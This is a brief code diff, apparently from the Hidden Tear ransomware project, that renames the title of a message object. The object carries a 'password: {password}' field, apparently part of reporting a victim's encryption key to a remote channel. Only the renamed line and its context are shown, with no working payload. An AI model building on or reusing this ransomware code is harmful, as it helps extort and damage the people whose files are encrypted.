@@ -20,7 +20,7 @@ namespace hidden_tear.Tools
                 {
                     new
                     {
-                        title = $"Good response",
+                        title = $"Hidden Tear",
                         description = $"password: {password}",
                         color = 16711680
                     }
